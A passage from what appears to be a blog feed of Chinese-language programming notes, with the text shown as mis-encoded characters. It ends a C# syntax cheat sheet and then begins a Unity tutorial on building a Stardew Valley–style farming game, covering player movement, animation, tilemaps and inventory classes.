class="line">  &#123;</span><br><span class="line">    base.SomeMethod();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-æ•°æ®ç±»å‹"><a href="#3-æ•°æ®ç±»å‹" class="headerlink" title="3. æ•°æ®ç±»å‹"></a>3. æ•°æ®ç±»å‹</h3><table><thead><tr><th>ç±»å‹</th><th style="text-align:center">ä¸¾ä¾‹</th></tr></thead><tbody><tr><td>æ•´æ•°ç±»å‹</td><td style="text-align:center">sbyteã€byteã€shortã€ushortã€intã€uintã€longã€ulong å’Œ char</td></tr><tr><td>æµ®ç‚¹å‹</td><td style="text-align:center">float, double</td></tr><tr><td>åè¿›åˆ¶ç±»å‹</td><td style="text-align:center">decimal</td></tr><tr><td>å¸ƒå°”ç±»å‹</td><td style="text-align:center">true æˆ– false å€¼ï¼ŒæŒ‡å®šçš„å€¼</td></tr><tr><td>ç©ºå­—ç¬¦ä¸²</td><td style="text-align:center">string</td></tr><tr><td>ç©ºç±»å‹</td><td style="text-align:center">null</td></tr><tr><td>åŠ¨æ€ç±»å‹</td><td style="text-align:center">dynamic(å…è®¸åœ¨è¿è¡Œæ—¶æ¨æ–­å˜é‡çš„ç±»å‹)</td></tr><tr><td>ç±»</td><td style="text-align:center">class</td></tr><tr><td>æ•°ç»„</td><td style="text-align:center"><em><code>datatype[] arrayName</code></em>, å¦‚<code>double[] arr = new double[10]</code></td></tr></tbody></table><ul><li>ç±»å‹è½¬æ¢æ–¹æ³•<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int i = 75;</span><br><span class="line">Console.WriteLine(i.ToString());</span><br><span class="line">i.ToBoolean();</span><br><span class="line">i.ToByte();</span><br><span class="line">i.toDouble();</span><br><span class="line">Convert.ToBoolean(i); // è½¬æ¢ä¸ºBoolean</span><br><span class="line">Boolean.Parse(string); // å°†å­—ç¬¦ä¸²è§£æä¸ºBoolean</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-å¸¸è§æ–¹æ³•"><a href="#4-å¸¸è§æ–¹æ³•" class="headerlink" title="4. å¸¸è§æ–¹æ³•"></a>4. å¸¸è§æ–¹æ³•</h3><ul><li><p>è¿ç®—ç¬¦<br>+, -, <em>, /, %, ++, â€“, ==, !=, &gt;, &lt;, &gt;=, &lt;=, &amp;&amp;, ||, !, =, +=, -=, </em>=, /=, %=</p></li><li><p>åˆ¤æ–­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if () &#123;&#125;;</span><br><span class="line">if () &#123;&#125; esle &#123;&#125;;</span><br><span class="line">if () &#123;&#125; else if () &#123;&#125;;</span><br><span class="line">Exp1 ? Exp2 : Exp3;</span><br><span class="line">switch(expression)&#123;</span><br><span class="line">  case constant-expression  :</span><br><span class="line">    statement(s);</span><br><span class="line">    break; </span><br><span class="line">  default :</span><br><span class="line">    statement(s);</span><br><span class="line">    break; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¾ªç¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while(condition) &#123;&#125;;</span><br><span class="line">do &#123;&#125; while ();</span><br><span class="line"></span><br><span class="line">for (int a = 10; a &lt; 20; a = a + 1) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">int[] fibarray = new int[] &#123; 0, 1, 1, 2, 3, 5, 8, 13 &#125;;</span><br><span class="line">foreach (int element in fibarray) &#123;&#125;;</span><br></pre></td></tr></table></figure></li><li><p>å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string[] strs = &#123; &quot;Hello&quot;, &quot;From&quot;, &quot;Tutorials&quot;, &quot;Point&quot; &#125;;</span><br><span class="line">string str = strs[0];</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th>æ–¹æ³•</th><th style="text-align:center">ä¸¾ä¾‹</th></tr></thead><tbody><tr><td><code>String.Compare(str1, str2)</code></td><td style="text-align:center">æ¯”è¾ƒä¸¤ä¸ªæŒ‡å®šçš„ string å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªè¡¨ç¤ºå®ƒä»¬åœ¨æ’åˆ—é¡ºåºä¸­ç›¸å¯¹ä½ç½®çš„æ•´æ•°</td></tr><tr><td><code>String.Concat(str1, str2, str3)</code></td><td style="text-align:center">è¿æ¥å­—ç¬¦ä¸²</td></tr><tr><td><code>bool str.Contains(&quot;t&quot;)</code></td><td style="text-align:center">åˆ¤æ–­å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«å­—ç¬¦</td></tr><tr><td><code>bool str.StartsWith(&quot;tt&quot;)</code></td><td style="text-align:center">åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šå­—ç¬¦å¼€å¤´</td></tr><tr><td><code>bool str.EndsWith(&quot;tt&quot;)</code></td><td style="text-align:center">åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šå­—ç¬¦ç»“å°¾</td></tr><tr><td><code>bool str.Equals(&quot;t&quot;)</code></td><td style="text-align:center">åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦å’ŒæŒ‡å®šå­—ç¬¦ä¸²ç›¸åŒ</td></tr><tr><td><code>int str.IndexOf(&quot;t&quot;)</code></td><td style="text-align:center">è¿”å›ç¬¬ä¸€æ¬¡å‡ºç°çš„ç´¢å¼•</td></tr><tr><td><code>int str.LastIndexOf(&quot;t&quot;)</code></td><td style="text-align:center">è¿”å›æœ€åä¸€æ¬¡å‡ºç°çš„ç´¢å¼•</td></tr><tr><td><code>string str.Insert(int startIndex, string value)</code></td><td style="text-align:center">æŒ‡å®šçš„å­—ç¬¦ä¸²è¢«æ’å…¥åœ¨å½“å‰ string å¯¹è±¡çš„æŒ‡å®šç´¢å¼•ä½ç½®</td></tr><tr><td><code>string String.Join(string separator, string[] value)</code></td><td style="text-align:center">è¿æ¥ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œä½¿ç”¨æŒ‡å®šçš„åˆ†éš”ç¬¦åˆ†éš”æ¯ä¸ªå…ƒç´ ã€‚</td></tr><tr><td><code>string str.Replace(string oldValue, string newValue)</code></td><td style="text-align:center">æ›¿æ¢</td></tr><tr><td><code>string[] str.Split(char[] separator)</code></td><td style="text-align:center">åˆ†å‰²ä¸ºæ•°ç»„</td></tr><tr><td><code>string str.ToLower()</code></td><td style="text-align:center">è½¬æ¢ä¸ºå°å†™</td></tr><tr><td><code>string str.ToUpper()</code></td><td style="text-align:center">è½¬æ¢ä¸ºå¤§å†™</td></tr><tr><td><code>string str.Trim()</code></td><td style="text-align:center">å»æ‰å‰åç©ºç™½ç¬¦</td></tr></tbody></table><h3 id="5-è‡ªå®šä¹‰æ•°æ®ç±»å‹"><a href="#5-è‡ªå®šä¹‰æ•°æ®ç±»å‹" class="headerlink" title="5. è‡ªå®šä¹‰æ•°æ®ç±»å‹"></a>5. è‡ªå®šä¹‰æ•°æ®ç±»å‹</h3><ul><li><p>enum<br>æšä¸¾åˆ—è¡¨ä¸­çš„æ¯ä¸ªç¬¦å·ä»£è¡¨ä¸€ä¸ªæ•´æ•°å€¼ï¼Œä¸€ä¸ªæ¯”å®ƒå‰é¢çš„ç¬¦å·å¤§çš„æ•´æ•°å€¼ã€‚ç¬¬ä¸€ä¸ªæšä¸¾ç¬¦å·çš„å€¼æ˜¯ 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enum Day &#123; Sun, Mon, Tue, Wed, Thu, Fri, Sat &#125;;</span><br><span class="line"></span><br><span class="line">int x = (int)Day.Sun // 0</span><br></pre></td></tr></table></figure></li><li><p>struct<br>struct è¯­å¥ä¸ºç¨‹åºå®šä¹‰äº†ä¸€ä¸ªå¸¦æœ‰å¤šä¸ªæˆå‘˜çš„æ–°çš„æ•°æ®ç±»å‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct Books</span><br><span class="line">&#123;</span><br><span class="line">  public string title;</span><br><span class="line">  public string author;</span><br><span class="line">  public string subject;</span><br><span class="line">  public int book_id;</span><br><span class="line">&#125;; </span><br><span class="line">Books Book1;        /* å£°æ˜ Book1ï¼Œç±»å‹ä¸º Books */</span><br></pre></td></tr></table></figure></li><li><p>interface<br>æ¥å£å®šä¹‰äº†å±æ€§ã€æ–¹æ³•å’Œäº‹ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">interface IMyInterface</span><br><span class="line">&#123;</span><br><span class="line">        // æ¥å£æˆå‘˜</span><br><span class="line">    void MethodToImplement();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class InterfaceImplementer : IMyInterface</span><br><span class="line">&#123;</span><br><span class="line">    static void Main()</span><br><span class="line">    &#123;</span><br><span class="line">        InterfaceImplementer iImp = new InterfaceImplementer();</span><br><span class="line">        iImp.MethodToImplement();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void MethodToImplement()</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(&quot;MethodToImplement() called.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Unity ä»¿æ˜Ÿéœ²è°·</title>
      <link href="/2024/12/30/unity-%E6%98%9F%E9%9C%B2%E8%B0%B7/"/>
      <url>/2024/12/30/unity-%E6%98%9F%E9%9C%B2%E8%B0%B7/</url>
      <content type="html"><![CDATA[<h3 id="èµ„æº"><a href="#èµ„æº" class="headerlink" title="èµ„æº"></a>èµ„æº</h3><ul><li>ç´ æï¼š<a href="https://itch.io/" target="_blank" rel="noopener">https://itch.io/</a>  <a href="https://shubibubi.itch.io/cozy-farm" target="_blank" rel="noopener">https://shubibubi.itch.io/cozy-farm</a></li><li>è¯¾ç¨‹èµ„æ–™ï¼š<a href="https://www.sikiedu.com/course/1789?ff=b_siki" target="_blank" rel="noopener">https://www.sikiedu.com/course/1789?ff=b_siki</a></li><li>æ•™å­¦è§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1TC4y1B7VZ?spm_id_from=333.788.player.switch&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9&amp;p=9" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1TC4y1B7VZ?spm_id_from=333.788.player.switch&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9&amp;p=9</a></li><li>unityç‰ˆæœ¬: 2023.0</li></ul><h3 id="é¡¹ç›®ç›®å½•"><a href="#é¡¹ç›®ç›®å½•" class="headerlink" title="é¡¹ç›®ç›®å½•"></a>é¡¹ç›®ç›®å½•</h3><ul><li>Assets<ul><li>Prefabs</li><li>Scenes</li><li>Sprites<ul><li>Palettes</li></ul></li><li>Animations</li></ul></li></ul><p>Scene</p><ul><li>Main Camera: sizeå¯ä»¥æ”¹å˜è§†é‡å¤§å°</li><li>Player</li><li>Grid - Tilemap</li></ul><p><br></p><h3 id="1-è§’è‰²ç§»åŠ¨"><a href="#1-è§’è‰²ç§»åŠ¨" class="headerlink" title="1. è§’è‰²ç§»åŠ¨"></a>1. è§’è‰²ç§»åŠ¨</h3><ol><li>å¯¼å…¥èµ„æº<br>å°† char1.png(èµ„æºæ˜¯å·²ç»åˆ‡å¥½ç‰‡çš„) æ”¾å…¥ Sprites æ–‡ä»¶å¤¹ - Pixels Per Unit: 16 - Filter Mode: Point - Compression: None</li><li>è§’è‰²ç§»åŠ¨<br>æ·»åŠ Playeråˆ°åœºæ™¯ä¸­ - æ·»åŠ å¹¶ç»‘å®šç»‘å®šPlayer.cs </li><li>æ·»åŠ åŠ¨ç”»<br>å°†èµ„æº char1_0 è‡³ char1_7 å…¨é€‰ï¼Œæ‹–åˆ°Playerä¸Šï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªåŠ¨ç”»åŠ¨æ€æœº, ä¿å­˜ä¸º Player_Walk_Down.anim åˆ° Animations æ–‡ä»¶å¤¹ï¼ˆä¸Šä¸‹å·¦å³ç§»åŠ¨çš„åŠ¨ç”»éƒ½åˆ›å»ºä¸Šï¼‰</li><li><p>åŠ¨ç”»çŠ¶æ€æœº: </p><ul><li>Animations æ–‡ä»¶å¤¹ä¸‹ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª Player.controllerï¼ŒåŒå‡»è¿›å…¥è¿™ä¸ªæ–‡ä»¶</li><li>åˆ›å»ºä¸€ä¸ªç©ºçŠ¶æ€: create state - empty ä¸º EmptyStateï¼Œå³å‡»è®¾ç½®ä¸ºé»˜è®¤çŠ¶æ€ Set as Layer Default State </li><li>åˆ›å»ºä¸€ä¸ªæ··åˆåŠ¨ç”»: æ ¹æ®å‚æ•°å€¼ç¡®å®šæ’­æ”¾å“ªä¸ªåŠ¨ç”»<ul><li>create state: Blend Tree ä¸º Walk , åŒå‡»Walkè¿›å…¥ç¼–è¾‘çŠ¶æ€ï¼ŒBlenType é€‰ 2D Simple Directional </li><li>Parameters: æ·»åŠ 2ä¸ªfloatå‚æ•°ä¸º horizontal å’Œ vertical, Inspectoré‡Œçš„Parametersä¹Ÿè®¾ç½®ä¸Š</li><li>Motion: æ·»åŠ 4ä¸ªMotion Field - å°†Animationçš„åŠ¨ç”»æ‹–è¿›Motion<br>Player_Walk_Down: 0 -1 1<br>Player_Walk_Left: -1 0 1<br>Player_Walk_Right: 1 0 1<br>Player_Walk_Up: 0 1 1</li></ul></li><li>çŠ¶æ€åˆ‡æ¢<ul><li>å›åˆ°Base Layerï¼ŒMake Transition è®© EmptyState å’Œ Walk ä¸¤ä¸ªçŠ¶æ€ç›¸äº’å¯åˆ‡æ¢ã€‚Parametersæ·»åŠ booleanå€¼ isWalking</li><li>ç‚¹å‡»ä¸­é—´çš„è¿çº¿: æ·»åŠ conditionè®¾ç½®isWalkingå€¼ã€‚è®¾ç½®Settings - Transition Duration(s): 0; Has Exit Time: false</li></ul></li><li>å¢åŠ ä»£ç æ§åˆ¶<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">public class Player : MonoBehaviour</span><br><span class="line">&#123;</span><br><span class="line">    public float speed = <span class="number">3</span>; </span><br><span class="line">    private Animator anim;</span><br><span class="line">    private <span class="keyword">void</span> Awake()</span><br><span class="line">    &#123;</span><br><span class="line">        anim = GetComponent&lt;Animator&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> Update()</span><br><span class="line">    &#123;</span><br><span class="line">        float x = Input.GetAxisRaw(<span class="string">"Horizontal"</span>);</span><br><span class="line">        float y = Input.GetAxisRaw(<span class="string">"Vertical"</span>);</span><br><span class="line">        Vector2 direction = <span class="keyword">new</span> Vector2(x, y);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŠ¨ç”»</span></span><br><span class="line">        <span class="keyword">if</span> (direction.magnitude &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            anim.SetBool(<span class="string">"isWalking"</span>, <span class="literal">true</span>);</span><br><span class="line">            anim.SetFloat(<span class="string">"horizontal"</span>, x);</span><br><span class="line">            anim.SetFloat(<span class="string">"vertical"</span>, y);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            anim.SetBool(<span class="string">"isWalking"</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä½ç§»</span></span><br><span class="line">        transform.Translate(direction * speed * Time.deltaTime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>æ”¹å˜é™æ­¢çŠ¶æ€ä¸‹æœå‘é—®é¢˜</p><ul><li>æ‰“å¼€Animationé¢æ¿ï¼Œé€‰ä¸­åœºæ™¯ä¸­çš„Player -  create new clip: Player_Idle_Down - å°†Char1_0å›¾ç‰‡æ‹–åˆ°0å¸§å¤„ï¼ˆä¸Šä¸‹å·¦å³æœå‘çš„åŠ¨ç”»éƒ½åˆ›å»ºä¸Šï¼‰</li><li>åˆ›å»ºæ··åˆæ ‘<ul><li>create state: Blend Tree ä¸º Idol , åŒå‡»Idolè¿›å…¥ç¼–è¾‘çŠ¶æ€ï¼ŒBlenType é€‰ 2D Simple Directional </li><li>Parameters ä¸º horizontal å’Œ vertical</li><li>Motion: æ·»åŠ 4ä¸ªMotion Field - å°†Animationçš„åŠ¨ç”»æ‹–è¿›Motion<br>Player_Idol_Down: 0 -1 1<br>Player_Idol_Left: -1 0 1<br>Player_Idol_Right: 1 0 1<br>Player_Idol_Up: 0 1 1</li></ul></li><li>åˆ é™¤emptyState, æ›¿æ¢ä¸ºIdolä¸ºé»˜è®¤çŠ¶æ€ï¼Œé‡æ–°è®¾ç½®è¿çº¿çš„condition</li></ul></li></ol><p><br></p><h3 id="2-ç“¦ç‰‡åœ°å›¾"><a href="#2-ç“¦ç‰‡åœ°å›¾" class="headerlink" title="2. ç“¦ç‰‡åœ°å›¾"></a>2. ç“¦ç‰‡åœ°å›¾</h3><ol><li>å¯¼å…¥èµ„æº<ul><li>å°† tiles.png(æ¯ä¸ªè´´å›¾éƒ½æ˜¯16 * 16pxçš„å¤§å°) æ”¾å…¥ Assets/Sprites, Pixels Per Unit:16, Filter Mode: Point, Compression: None</li><li>æ›´æ”¹åˆ‡å›¾æ–¹å¼: Open Sprite Editor - Slice: Group By Cell Size 16 * 16 - ç‚¹å‡»slice</li></ul></li><li><p>æ·»åŠ åœ°å›¾ + è°ƒè‰²æ¿</p><ul><li>åˆ›å»ºç“¦ç‰‡åœ°å›¾ï¼šcreate 2D Object - TileMap - Rectangileï¼ˆé¡µé¢ä¼šå¤šäº†å¾ˆå¤šå°æ ¼å­ï¼Œæ¯ä¸ªéƒ½æ˜¯ 1m * 1mçš„å¤§å°ï¼‰</li><li>åˆ›å»ºç“¦ç‰‡åœ°å›¾è°ƒè‰²æ¿ï¼šWindow - 2D - Tile Paletteï¼ŒCreate New Tile Pattle: Ground ä¿å­˜åœ¨Assets/Sprites/Palettesï¼Œå°†æ•´ä¸ªtiles.pngæ‹–å…¥è°ƒè‰²æ¿ï¼Œä¿å­˜åˆ° Assets/Sprites/Palettes</li><li>è°ƒè‰²æ¿ç»˜åˆ¶åœ°å›¾å·¥å…·ï¼šé“…ç¬”-é€‰ä¸­è‰²å—ç»˜åˆ¶åˆ°åœ°å›¾ä¸Šï¼Œå—å¤åˆ¶ï¼Œå¡«å……ï¼Œé€‰å–è‰²å—</li><li><p>åœ°å›¾å±‚çº§åˆ†ç±»<br>ç‚¹å‡»åœºæ™¯ä¸­çš„Player, Sorting Layer - Add Sorting Layer, æŠŠä¸‹é¢çš„è¿™å‡ å±‚æ·»åŠ ä¸Š</p><ul><li>Layer1: Env_Background: èƒŒæ™¯</li><li>Env_Ground_Bottomï¼šåœ°é¢åº•å±‚</li><li>Env_Ground_Topï¼šåœ°é¢é¡¶å±‚</li><li>Env_Buildingï¼šæ”¾ç½®å»ºç­‘ç‰©</li><li>Interactable: å¯ä»¥äº¤äº’çš„ç“¦ç‰‡åœ°å›¾ï¼Œç§æ¤</li><li>Game: ä¸»è§’ï¼Œnpc</li></ul><p>åœ¨Gridä¸‹åˆ›å»º4ä¸ªç“¦ç‰‡åœ°å›¾ï¼Œåˆ†åˆ«å¯¹åº”å±‚çº§Background, Env_Ground_Bottom, Env_Ground_Top,Interactable</p></li></ul></li><li><p>ç»˜åˆ¶åœ°å›¾</p><ul><li>Env_Background: ç»˜åˆ¶çº¯ç»¿è‰²è‰åœ°</li><li>Env_Ground_Bottomï¼šç»˜åˆ¶æ‚¬å´–åœ°å½¢</li><li>Env_Ground_Topï¼šåœ°é¢é¡¶å±‚</li><li>Env_Buildingï¼šæ”¾ç½®å»ºç­‘ç‰©<ul><li>å¯¼å…¥buildings.pngï¼Œæ”¾ç½®æˆ¿å­House, ç»™House Add Component - Physics 2D - Polygon Collider - ç‚¹å‡»Edit Colliderç¼–è¾‘å¤šè¾¹å½¢ç¢°æ’å™¨æ¯ä¸ªç‚¹çš„ä½ç½®</li><li>å¢åŠ Playerå’ŒHouseçš„ç¢°æ’æ£€æµ‹ï¼šç»™Playerè®¾ç½®åˆšä½“ - Add Component - Righdbody 2D - Gravity Scale: 0 - Constraints - Freeze Rotation-Z: å‹¾é€‰ï¼ˆç¢°æ’æ—¶ä¸ä¼šè¢«æ”¹å˜æœå‘ï¼‰; ç»™Playeræ·»åŠ Box Collider</li></ul></li><li>Interactable: å¯ä»¥äº¤äº’çš„ç“¦ç‰‡åœ°å›¾ï¼Œç§æ¤</li><li>Game: ä¸»è§’ï¼Œnpc</li></ul></li></ol><p><br></p><h3 id="3-èƒŒåŒ…ç‰©å“"><a href="#3-èƒŒåŒ…ç‰©å“" class="headerlink" title="3. èƒŒåŒ…ç‰©å“"></a>3. èƒŒåŒ…ç‰©å“</h3><h4 id="3-1-ç§å­æ‹¾èµ·"><a href="#3-1-ç§å­æ‹¾èµ·" class="headerlink" title="3.1 ç§å­æ‹¾èµ·"></a>3.1 ç§å­æ‹¾èµ·</h4><ol><li>å¯¼å…¥èµ„æºï¼šå¯¼å…¥ crops_all.png - ç¼–è¾‘Grid By Cell Size 16 * 16 Slice - Pixels Per Unit: 32</li><li>ç§å­é¢„åˆ¶ä»¶ï¼šå°†èåœç§å­å›¾ç‰‡æ”¾å…¥åœºæ™¯ä¸ºSeed_Carrotï¼Œå°†å®ƒæ‹–å…¥Assets/Prefabsï¼Œä¼šè‡ªåŠ¨å˜æˆPrefabã€‚æ·»åŠ Box Collider 2D, Is Trigger: trueï¼›æ·»åŠ æ ‡ç­¾Tag: Pickable<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// Player.cs</span><br><span class="line">// ç§å­æ‹¾èµ·</span><br><span class="line">private void OnTriggerEnter2D(Collider2D collision)</span><br><span class="line">&#123;</span><br><span class="line">    if (collision.tag == &quot;Pickable&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        Destroy(collision.gameObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="3-2-èƒŒåŒ…ä¿å­˜ç‰©å“"><a href="#3-2-èƒŒåŒ…ä¿å­˜ç‰©å“" class="headerlink" title="3.2 èƒŒåŒ…ä¿å­˜ç‰©å“"></a>3.2 èƒŒåŒ…ä¿å­˜ç‰©å“</h4><ol><li><p>åˆ›å»ºæ•°æ®çš„ä¸‰ä¸ªç±»</p><ul><li>InventoryData ä»“åº“ä¿¡æ¯ <code>List&lt;SlotData&gt;</code></li><li>SlotData ç‰©å“ä¿¡æ¯åŒ…å« ItemData, count</li><li>ItemData ç‰©å“ä¿¡æ¯ç±»<ul><li>itemType</li><li>itemSprite</li><li>itemPrefab</li><li>maxCount<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// InventoryData.cs</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">[CreateAssetMenu()]</span><br><span class="line">public class InventoryData : ScriptableObject</span><br><span class="line">&#123;</span><br><span class="line">    public List&lt;SlotData&gt; slotList;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// SlotData.cs</span><br><span class="line">using System;</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">[Serializable]</span><br><span class="line">public class SlotData</span><br><span class="line">&#123;</span><br><span class="line">    public ItemData item;</span><br><span class="line">    public int count = 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// ItemData.csusing System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">public enum ItemType</span><br><span class="line">&#123;</span><br><span class="line">    None,</span><br><span class="line">    Seed_Carrot,</span><br><span class="line">    Seed_Tomato,</span><br><span class="line">    Hoe</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[CreateAssetMenu()]</span><br><span class="line">public class ItemData: ScriptableObject</span><br><span class="line">&#123;</span><br><span class="line">    public ItemType type= ItemType.None;</span><br><span class="line">    public Sprite sprite;</span><br><span class="line">    public GameObject prefab;</span><br><span class="line">    public int maxCount = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>åˆ›å»ºResourcesç”¨æ¥ä¿å­˜æ•°æ®</p><ul><li>åˆ›å»ºAssets/Resources/Dataæ–‡ä»¶å¤¹ï¼Œåœ¨Dataæ–‡ä»¶å¤¹é‡Œ</li><li>create ItemData: Seed_Carrot, Seed_Tomato è®¾ç½®å¥½å‚æ•°</li><li>create InventoryData: Backpack ç”¨æ¥ç®¡ç†èƒŒåŒ…çš„ç‰©å“ä¿¡æ¯</li></ul></li><li><p>ç‰©å“ç®¡ç†é€»è¾‘<br>åœºæ™¯ä¸­create emptyï¼ŒæŒ‚è½½Assets/Scripts/Manager/InventoryMananger.csï¼Œç”¨æ¥åˆå§‹åŒ–ç‰©å“å­—æ®µã€èƒŒåŒ…æ•°æ®ï¼Œå¤„ç†ç‰©å“æ‹¾å–é€»è¾‘</p></li><li><p>ç»˜åˆ¶èƒŒåŒ…</p></li></ol><ul><li>åœºæ™¯ä¸­ create UI Panel, è®¾ç½®Canvas - UI Scale Mode: Scale With Screen Size - Reference Resolution: 1920 * 1080 </li><li>è®¾ç½®Panel: BackpackUIï¼Œç§»é™¤Imageç»„ä»¶ï¼Œåœ¨BackpackUIä¸‹æ·»åŠ èƒŒåŒ…ç´ æ create Image: Bg_Frame, Bg_Right, Bg_Left è°ƒæ•´å¤§å°</li><li>æ·»åŠ ç‰©å“ç½‘æ ¼æ : create empty - add component - Grid Layout Group: SlotGrid - åœ¨å®ƒä¸‹é¢æ·»åŠ 